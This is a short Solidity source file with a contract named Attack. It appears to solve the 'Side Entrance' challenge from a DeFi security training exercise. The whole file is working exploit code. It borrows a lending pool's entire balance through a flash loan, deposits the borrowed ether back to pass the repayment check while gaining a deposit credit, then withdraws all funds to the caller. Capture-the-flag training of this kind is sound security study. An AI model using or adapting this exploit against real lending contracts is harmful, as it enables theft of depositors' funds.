// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external payable;

    function flashLoan(uint256 amount) external;
}

contract Attack {
    ISideEntranceLenderPool i_lendingPool;

    // uint256 amount = address(i_lendingPool).balance;

    constructor(address _lendingPoolAddress) {
        i_lendingPool = ISideEntranceLenderPool(_lendingPoolAddress);
    }

    receive() external payable {}

    function drainLender() public {
        i_lendingPool.flashLoan(address(i_lendingPool).balance);
        i_lendingPool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        i_lendingPool.deposit{value: msg.value}();
    }
}
